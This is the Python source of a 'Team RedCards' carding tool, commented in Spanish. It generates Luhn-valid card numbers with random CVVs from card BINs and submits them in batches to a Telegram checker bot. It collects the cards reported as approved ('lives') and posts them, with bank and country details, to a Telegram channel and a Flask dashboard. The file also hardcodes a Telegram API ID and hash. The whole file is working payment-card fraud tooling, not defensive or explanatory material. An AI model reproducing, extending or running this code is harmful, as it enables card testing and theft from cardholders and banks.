import threading
import asyncio
import random
import time
import os
from datetime import datetime, timedelta
from flask import Flask, render_template_string, request, jsonify
from telethon import TelegramClient, events
from telethon.errors import FloodWaitError, RPCError

# ============ CONFIGURACIÓN ============
API_ID = int(os.environ.get('API_ID', '22154650'))
API_HASH = os.environ.get('API_HASH', '2b554e270efb419af271c47ffe1d72d3')
SESSION_NAME = 'session'

# Manejo flexible del CHANNEL_ID (string o int)
channel_env = os.environ.get('CHANNEL_ID', '-1003101739772')
try:
    CHANNEL_ID = int(channel_env)
except ValueError:
    CHANNEL_ID = channel_env

PORT = int(os.environ.get('PORT', 5000))

client = TelegramClient(SESSION_NAME, API_ID, API_HASH)
log_messages = []
lives_list = []  # Lista de lives (CCs aprobadas)
channelid = -1003101739772  # ID del canal Team RedCards
approved_count = 0
declined_count = 0
app = Flask(__name__)

# ============ FUNCIONES UTILITARIAS ============

def luhn_checksum(card_number):
    """Calcula el checksum de Luhn"""
    def digits_of(n):
        return [int(d) for d in str(n)]
    
    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d * 2))
    return checksum % 10

def generate_luhn_digit(partial_card):
    """Genera el dígito de verificación de Luhn"""
    check_digit = luhn_checksum(str(partial_card) + '0')
    return (10 - check_digit) % 10

def get_current_date():
    """Obtiene la fecha actual en formato MM/YY"""
    now = datetime.now()
    return f"{now.month:02d}/{now.year % 100:02d}"

def is_date_valid(month, year):
    """Verifica si una fecha MM/YY es válida (no está vencida)"""
    try:
        month = int(month)
        year = int(year)
        
        if year <= 30:
            year += 2000
        elif year <= 99:
            year += 1900
        
        if month == 12:
            expiry_date = datetime(year + 1, 1, 1) - timedelta(days=1)
        else:
            expiry_date = datetime(year, month + 1, 1) - timedelta(days=1)
        
        return expiry_date >= datetime.now()
    except:
        return False

def generate_random_valid_date():
    """Genera una fecha aleatoria válida"""
    now = datetime.now()
    days_ahead = random.randint(0, 365 * 5)
    future_date = now + timedelta(days=days_ahead)
    month = f"{future_date.month:02d}"
    year = f"{future_date.year}"
    return month, year

def generate_cc_variants(ccbase, count=20):
    """Genera 20 variantes de tarjetas con Luhn"""
    if ',' in ccbase:
        separator = ','
    elif '|' in ccbase:
        separator = '|'
    else:
        log_messages.append(f"❌ Formato desconocido: {ccbase}")
        return []
    
    parts = ccbase.strip().split(separator)
    
    if len(parts) >= 4:
        cardnumber = parts[0]
        month = parts[1]
        year = parts[2]
        cvv = parts[3]
    else:
        log_messages.append(f"❌ Formato inválido: {ccbase}")
        return []
    
    if len(cardnumber) < 12:
        log_messages.append(f"❌ Tarjeta muy corta: {cardnumber}")
        return []
    
    date_is_valid = is_date_valid(month, year)
    variants = []
    
    if not date_is_valid:
        log_messages.append(f"⚠️ Scrapper - Fecha vencida: {month}/{year}")
        month, year = generate_random_valid_date()
        log_messages.append(f"⚠️ Scrapper - Fecha actualizada: {month}/{year}")
        
        bin_number = cardnumber[:-6]
        
        for i in range(count):
            random_digits = ''.join([str(random.randint(0, 9)) for _ in range(5)])
            partial = bin_number + random_digits
            luhn_digit = generate_luhn_digit(partial)
            complete_number = partial + str(luhn_digit)
            random_cvv = random.randint(100, 999)
            variant = f"{complete_number}{separator}{month}{separator}{year}{separator}{random_cvv}"
            
            if variant not in variants:
                variants.append(variant)
        
        log_messages.append(f"✅ Generadas 20 CCs (Luhn + fecha actualizada)")
    
    else:
        bin_number = cardnumber[:-4]
        
        for i in range(count):
            random_digits = ''.join([str(random.randint(0, 9)) for _ in range(3)])
            partial = bin_number + random_digits
            luhn_digit = generate_luhn_digit(partial)
            complete_number = partial + str(luhn_digit)
            random_cvv = random.randint(100, 999)
            variant = f"{complete_number}{separator}{month}{separator}{year}{separator}{random_cvv}"
            
            if variant not in variants:
                variants.append(variant)
        
        log_messages.append(f"✅ Generadas 20 CCs (Luhn válido)")
    
    return variants

# ============ MANEJADOR DE EVENTOS ============

async def response_handler(event):
    """Maneja respuestas de mensajes aprobados/rechazados"""
    global approved_count, declined_count, channelid, lives_list
    
    full_message = event.message.message if event.message.message else ""
    message_lower = full_message.lower()
    
    if "✅" in full_message or "approved" in message_lower:
        approved_count += 1
        
        lines = full_message.split('\n')
        cc_number = status = response = country = bank = card_type = gate = ""
        
        for line in lines:
            if 'cc:' in line.lower():
                cc_number = line.split(':', 1)[1].strip() if len(line.split(':', 1)) > 1 else ""
            elif 'status:' in line.lower():
                status = line.split(':', 1)[1].strip() if len(line.split(':', 1)) > 1 else ""
            elif 'response:' in line.lower():
                response = line.split(':', 1)[1].strip() if len(line.split(':', 1)) > 1 else ""
            elif 'country:' in line.lower():
                country = line.split(':', 1)[1].strip() if len(line.split(':', 1)) > 1 else ""
            elif 'bank:' in line.lower():
                bank = line.split(':', 1)[1].strip() if len(line.split(':', 1)) > 1 else ""
            elif 'type:' in line.lower():
                card_type = line.split(':', 1)[1].strip() if len(line.split(':', 1)) > 1 else ""
            elif 'gate:' in line.lower():
                gate = line.split(':', 1)[1].strip() if len(line.split(':', 1)) > 1 else ""
        
        log_messages.append(f"✅ LIVE ENCONTRADA: {cc_number[:12]}... | {status}")
        
        formatted_message = f"""╔════════════════════════════════════════╗
           Team RedCards 💳
╚════════════════════════════════════════╝

💳 CC: {cc_number}
✅ Status: {status}
📊 Response: {response}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🗺️ Country: {country}
🏦 Bank: {bank}
💰 Type: {card_type}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💵 GATE: {gate}"""
        
        live_entry = {
            "cc": cc_number,
            "status": status,
            "response": response,
            "country": country,
            "bank": bank,
            "type": card_type,
            "gate": gate
        }
        lives_list.append(live_entry)
        
        if len(lives_list) > 100:
            lives_list.pop(0)
        
        try:
            image_path = 'x1.jpg'
            
            if os.path.exists(image_path):
                await client.send_file(
                    channelid,
                    image_path,
                    caption=formatted_message,
                    parse_mode='markdown'
                )
            else:
                await client.send_message(
                    channelid,
                    formatted_message,
                    parse_mode='markdown'
                )
        
        except Exception as e:
            log_messages.append(f"❌ Error: {e}")
    
    elif "❌" in full_message or "declined" in message_lower:
        declined_count += 1
        log_messages.append(f"❌ DECLINADA: {full_message[:50]}...")
    
    if len(log_messages) > 100:
        log_messages.pop(0)

# ============ FUNCIONES DE ENVÍO ============

async def load_commands():
    """Carga comandos desde cmds.txt"""
    try:
        if os.path.exists('cmds.txt'):
            with open('cmds.txt', 'r', encoding='utf-8') as f:
                cmds = [line.strip() for line in f.readlines() if line.strip()]
                if cmds:
                    return cmds
        return ['/check', '/validate', '/test']
    except Exception as e:
        log_messages.append(f"❌ Error cargando comandos: {e}")
        return ['/check']

async def send_to_bot():
    """Envía CCs al bot - 2 simultáneamente"""
    while True:
        try:
            if not os.path.exists('ccs.txt'):
                log_messages.append("⏳ Esperando ccs.txt...")
                await asyncio.sleep(30)
                continue
            
            with open('ccs.txt', 'r', encoding='utf-8') as f:
                ccs_list = f.readlines()
            
            if ccs_list:
                current_cc = ccs_list[0].strip()
                
                if len(ccs_list) > 1:
                    with open('ccs.txt', 'w', encoding='utf-8') as f:
                        f.writelines(ccs_list[1:])
                else:
                    with open('ccs.txt', 'w', encoding='utf-8') as f:
                        f.write("")
                
                log_messages.append(f"🔄 Scrapper - Generando 20 CCs del BIN: {current_cc[:12]}...")
                
                cc_variants = generate_cc_variants(current_cc, count=20)
                
                if not cc_variants:
                    log_messages.append(f"❌ Error generando variantes")
                    await asyncio.sleep(20)
                    continue
                
                commands = await load_commands()
                
                # ENVIAR 2 SIMULTÁNEAMENTE
                for i in range(0, len(cc_variants), 2):
                    pair = cc_variants[i:i+2]
                    tasks = []
                    
                    for j, cc in enumerate(pair):
                        selected_command = random.choice(commands)
                        message = f"{selected_command} {cc}"
                        
                        async def send_cc(msg, idx):
                            try:
                                await client.send_message('@Alphachekerbot', msg)
                                num = i + idx + 1
                                log_messages.append(f"✓ Scrapper enviado #{num}/20: {msg[:20]}...")
                            except FloodWaitError as e:
                                log_messages.append(f"⏸️ Esperando {e.seconds}s...")
                                await asyncio.sleep(e.seconds)
                            except RPCError as e:
                                log_messages.append(f"❌ Error: {e}")
                        
                        tasks.append(send_cc(message, j))
                    
                    # Ejecutar ambas al mismo tiempo
                    await asyncio.gather(*tasks)
                    
                    # Esperar entre lotes
                    await asyncio.sleep(21)
                
                log_messages.append(f"🎉 Scrapper - Lote completado: 20/20 CCs enviadas")
            else:
                log_messages.append("⏳ Sin CCs en cola...")
                await asyncio.sleep(20)
        
        except Exception as e:
            log_messages.append(f"❌ Error: {e}")
            await asyncio.sleep(20)

async def start_client():
    """Inicia el cliente de Telegram"""
    try:
        log_messages.append("🚀 Iniciando Scrapper...")
        await client.start()
        log_messages.append("✅ Scrapper conectado correctamente")
        
        client.add_event_handler(response_handler, events.MessageEdited(chats='@Alphachekerbot'))
        
        await asyncio.gather(send_to_bot(), client.run_until_disconnected())
    except Exception as e:
        log_messages.append(f"❌ Error: {e}")

def telethon_thread_fn():
    """Ejecuta el cliente de Telegram en un hilo separado"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_client())

# ============ RUTAS FLASK ============

@app.route('/')
def index():
    """Panel web principal"""
    html = '''
    <!DOCTYPE html>
    <html lang="es">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>SCRAPPER TEAM REDCARDS</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            body {
                background: linear-gradient(135deg, #0a0e27 0%, #1a1a3e 50%, #2d1b3d 100%);
                font-family: 'Arial Black', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                color: #fff;
                min-height: 100vh;
                padding: 20px;
            }
            .container {
                max-width: 1400px;
                margin: 0 auto;
            }
            .header {
                text-align: center;
                margin-bottom: 30px;
                padding: 40px;
                background: linear-gradient(135deg, rgba(255, 20, 20, 0.15) 0%, rgba(139, 0, 0, 0.1) 100%);
                border-radius: 20px;
                border: 3px solid #ff1414;
                box-shadow: 0 0 40px rgba(255, 20, 20, 0.6), inset 0 0 30px rgba(255, 20, 20, 0.1);
                position: relative;
                overflow: hidden;
            }
            .header::before {
                content: '';
                position: absolute;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                background: radial-gradient(circle at 20% 50%, rgba(255, 50, 50, 0.1), transparent);
                pointer-events: none;
            }
            .header h1 {
                font-size: 3.5em;
                margin-bottom: 10px;
                color: #ff1414;
                text-shadow: 0 0 20px rgba(255, 20, 20, 0.8), 0 0 40px rgba(255, 50, 50, 0.5);
                letter-spacing: 2px;
                font-weight: 900;
                z-index: 1;
                position: relative;
            }
            .header .subtitle {
                font-size: 1em;
                color: #ffaa00;
                text-transform: uppercase;
                letter-spacing: 3px;
                font-weight: bold;
            }
            .stats {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
                gap: 20px;
                margin-bottom: 30px;
            }
            .stat-box {
                background: linear-gradient(135deg, rgba(255, 20, 20, 0.1) 0%, rgba(139, 0, 0, 0.05) 100%);
                padding: 30px;
                border-radius: 15px;
                border: 2px solid #ff1414;
                text-align: center;
                backdrop-filter: blur(10px);
                transition: all 0.3s ease;
                box-shadow: 0 0 20px rgba(255, 20, 20, 0.3), inset 0 0 15px rgba(255, 20, 20, 0.05);
            }
            .stat-box:hover {
                transform: translateY(-8px) scale(1.05);
                box-shadow: 0 10px 40px rgba(255, 20, 20, 0.5), inset 0 0 20px rgba(255, 20, 20, 0.15);
                border-color: #ffaa00;
            }
            .stat-box h3 {
                color: #ffaa00;
                margin-bottom: 15px;
                font-size: 0.95em;
                text-transform: uppercase;
                letter-spacing: 1px;
            }
            .stat-box .number {
                font-size: 4em;
                font-weight: 900;
                color: #ff1414;
                text-shadow: 0 0 15px rgba(255, 20, 20, 0.6);
            }
            .main-content {
                display: grid;
                grid-template-columns: 1fr 1fr;
                gap: 20px;
                margin-bottom: 30px;
            }
            .scrapper-section, .lives-section {
                background: linear-gradient(135deg, rgba(255, 20, 20, 0.08) 0%, rgba(139, 0, 0, 0.03) 100%);
                padding: 25px;
                border-radius: 15px;
                border: 2px solid #ff1414;
                box-shadow: 0 0 15px rgba(255, 20, 20, 0.2);
            }
            .scrapper-section h2, .lives-section h2 {
                margin-bottom: 20px;
                color: #ffaa00;
                font-size: 1.8em;
                text-shadow: 0 0 10px rgba(255, 170, 0, 0.5);
                letter-spacing: 1px;
            }
            .search-box {
                margin-bottom: 15px;
                display: flex;
                gap: 10px;
            }
            .search-box input {
                flex: 1;
                padding: 12px 15px;
                background: rgba(0, 0, 0, 0.3);
                border: 2px solid #ff1414;
                border-radius: 8px;
                color: #fff;
                font-size: 1em;
            }
            .search-box input::placeholder {
                color: rgba(255, 170, 0, 0.6);
            }
            .search-box input:focus {
                outline: none;
                border-color: #ffaa00;
                box-shadow: 0 0 15px rgba(255, 170, 0, 0.5);
            }
            .search-box button {
                padding: 12px 25px;
                background: linear-gradient(135deg, #ff1414 0%, #cc0000 100%);
                border: 2px solid #ffaa00;
                border-radius: 8px;
                color: white;
                font-weight: bold;
                cursor: pointer;
                transition: all 0.2s ease;
                text-transform: uppercase;
            }
            .search-box button:hover {
                box-shadow: 0 0 20px rgba(255, 170, 0, 0.6);
            }
            .scrapper-container, .lives-container {
                background: rgba(0, 0, 0, 0.5);
                padding: 15px;
                border-radius: 10px;
                height: 500px;
                overflow-y: auto;
                font-family: 'Courier New', monospace;
                font-size: 0.9em;
                line-height: 1.7;
            }
            .log-entry {
                padding: 8px 0;
                border-bottom: 1px solid rgba(255, 20, 20, 0.2);
            }
            .log-entry.success {
                color: #00ff00;
                text-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
            }
            .log-entry.error {
                color: #ff1414;
                text-shadow: 0 0 10px rgba(255, 20, 20, 0.5);
            }
            .log-entry.info {
                color: #ffaa00;
            }
            .log-entry.warning {
                color: #ffd700;
            }
            .live-card {
                background: linear-gradient(135deg, rgba(0, 255, 0, 0.05) 0%, rgba(50, 150, 50, 0.02) 100%);
                padding: 15px;
                margin-bottom: 10px;
                border-radius: 10px;
                border-left: 4px solid #00ff00;
                border-bottom: 2px solid #ff1414;
                transition: all 0.2s ease;
            }
            .live-card:hover {
                transform: translateX(8px);
                box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
                border-left: 4px solid #ffaa00;
            }
            .live-card-header {
                display: flex;
                justify-content: space-between;
                margin-bottom: 10px;
                font-weight: bold;
                color: #00ff00;
                font-size: 1.1em;
                text-shadow: 0 0 10px rgba(0, 255, 0, 0.4);
            }
            .live-card-info {
                font-size: 0.9em;
                color: #ffaa00;
                margin: 5px 0;
                padding-left: 5px;
            }
            /* Scrollbar */
            .scrapper-container::-webkit-scrollbar,
            .lives-container::-webkit-scrollbar {
                width: 10px;
            }
            .scrapper-container::-webkit-scrollbar-track,
            .lives-container::-webkit-scrollbar-track {
                background: rgba(0, 0, 0, 0.3);
                border-radius: 10px;
            }
            .scrapper-container::-webkit-scrollbar-thumb,
            .lives-container::-webkit-scrollbar-thumb {
                background: linear-gradient(135deg, #ff1414 0%, #ffaa00 100%);
                border-radius: 10px;
            }
            @media (max-width: 1200px) {
                .main-content {
                    grid-template-columns: 1fr;
                }
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🎮 SCRAPPER TEAM REDCARDS 🔴</h1>
                <div class="subtitle">⚡ Elite Checker System ⚡</div>
            </div>
            
            <div class="stats">
                <div class="stat-box">
                    <h3>✅ LIVES</h3>
                    <div class="number" id="approved">{{ approved }}</div>
                </div>
                <div class="stat-box">
                    <h3>❌ DECLINADAS</h3>
                    <div class="number" id="declined">{{ declined }}</div>
                </div>
                <div class="stat-box">
                    <h3>💎 ENCONTRADAS</h3>
                    <div class="number" id="lives-count">0</div>
                </div>
            </div>
            
            <div class="main-content">
                <div class="scrapper-section">
                    <h2>🔄 SCRAPPER</h2>
                    <div class="scrapper-container" id="scrapper">
                        {{ log }}
                    </div>
                </div>
                
                <div class="lives-section">
                    <h2>💎 LIVES ENCONTRADAS</h2>
                    <div class="search-box">
                        <input type="text" id="search-input" placeholder="🔍 Buscar LIVE...">
                        <button onclick="searchLives()">🔎</button>
                    </div>
                    <div class="lives-container" id="lives">
                        <div class="log-entry info">Esperando LIVES...</div>
                    </div>
                </div>
            </div>
        </div>
        
        <script>
            let isSearching = false;
            
            function displayLives(lives, filterText = '') {
                const livesContainer = document.getElementById('lives');
                
                if (!lives || lives.length === 0) {
                    livesContainer.innerHTML = '<div class="log-entry info">No hay LIVES todavía...</div>';
                    return;
                }
                
                let filtered = lives;
                if (filterText) {
                    filtered = lives.filter(live => 
                        live.cc.toLowerCase().includes(filterText.toLowerCase()) ||
                        live.bank.toLowerCase().includes(filterText.toLowerCase()) ||
                        live.country.toLowerCase().includes(filterText.toLowerCase()) ||
                        live.type.toLowerCase().includes(filterText.toLowerCase()) ||
                        live.gate.toLowerCase().includes(filterText.toLowerCase())
                    );
                }
                
                if (filtered.length === 0) {
                    livesContainer.innerHTML = '<div class="log-entry error">No se encontraron resultados</div>';
                    return;
                }
                
                livesContainer.innerHTML = filtered.map(live => `
                    <div class="live-card">
                        <div class="live-card-header">
                            <span>💳 ${live.cc}</span>
                            <span style="color: #00ff00;">✅ LIVE</span>
                        </div>
                        <div class="live-card-info">🏦 ${live.bank}</div>
                        <div class="live-card-info">🗺️ ${live.country}</div>
                        <div class="live-card-info">💰 ${live.type}</div>
                        <div class="live-card-info">💵 ${live.gate}</div>
                    </div>
                `).join('');
            }
            
            function searchLives() {
                const searchText = document.getElementById('search-input').value;
                isSearching = searchText.length > 0;
                
                fetch('/get_lives')
                    .then(response => response.json())
                    .then(data => {
                        displayLives(data.lives, searchText);
                    });
            }
            
            function updateLogs() {
                fetch('/get_logs')
                    .then(response => response.json())
                    .then(data => {
                        document.getElementById('scrapper').innerHTML = data.log
                            .split('\\n')
                            .map(line => {
                                let className = 'info';
                                if (line.includes('✓') || line.includes('✅')) className = 'success';
                                else if (line.includes('❌') || line.includes('Error')) className = 'error';
                                else if (line.includes('⚠️') || line.includes('⏸️')) className = 'warning';
                                return `<div class="log-entry ${className}">${line}</div>`;
                            })
                            .join('');
                        
                        document.getElementById('approved').textContent = data.approved;
                        document.getElementById('declined').textContent = data.declined;
                        
                        const scrapper = document.getElementById('scrapper');
                        scrapper.scrollTop = scrapper.scrollHeight;
                    });
                
                if (!isSearching) {
                    fetch('/get_lives')
                        .then(response => response.json())
                        .then(data => {
                            document.getElementById('lives-count').textContent = data.lives.length;
                            displayLives(data.lives);
                            
                            const lives = document.getElementById('lives');
                            lives.scrollTop = lives.scrollHeight;
                        });
                }
            }
            
            document.addEventListener('DOMContentLoaded', function() {
                document.getElementById('search-input').addEventListener('keypress', function(e) {
                    if (e.key === 'Enter') searchLives();
                });
                
                setInterval(updateLogs, 3000);
                updateLogs();
            });
        </script>
    </body>
    </html>
    '''
    return render_template_string(html, log='\n'.join(log_messages[-50:]), approved=approved_count, declined=declined_count)

@app.route('/get_logs')
def get_logs():
    """Obtiene los logs actuales en JSON"""
    return jsonify({
        "log": '\n'.join(log_messages[-50:]),
        "approved": approved_count,
        "declined": declined_count
    })

@app.route('/get_lives')
def get_lives():
    """Obtiene la lista de LIVES (CCs aprobadas)"""
    return jsonify({
        "lives": lives_list
    })

@app.route('/health')
def health():
    """Health check para Railway"""
    return jsonify({"status": "ok", "approved": approved_count, "declined": declined_count, "lives": len(lives_list)})

# ============ INICIO ============

if __name__ == '__main__':
    telethon_thread = threading.Thread(target=telethon_thread_fn, daemon=True)
    telethon_thread.start()
    time.sleep(2)
    
    app.run('0.0.0.0', PORT, debug=False)
